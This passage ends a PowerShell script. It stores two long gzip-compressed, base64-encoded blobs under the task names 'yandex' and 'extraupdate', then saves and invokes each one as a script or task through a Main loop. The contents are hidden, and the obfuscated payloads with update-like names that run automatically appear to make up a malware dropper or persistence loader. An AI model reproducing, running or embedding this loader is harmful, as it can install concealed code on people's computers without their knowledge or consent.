    "yandex" = "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"
    "extraupdate" = "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"

        }

        writedbg "Main - "
        foreach ($key in $tasks.Keys)
        {
            $task = $key
            $body = $tasks.$key
            writedbg "Main - $task"
            Save-Script -taskName $task -Body $body
            Invoke-Script -taskName $task
        }
    }
}

Main

if ($globalDebug)
{
    Start-Sleep -Seconds 100
}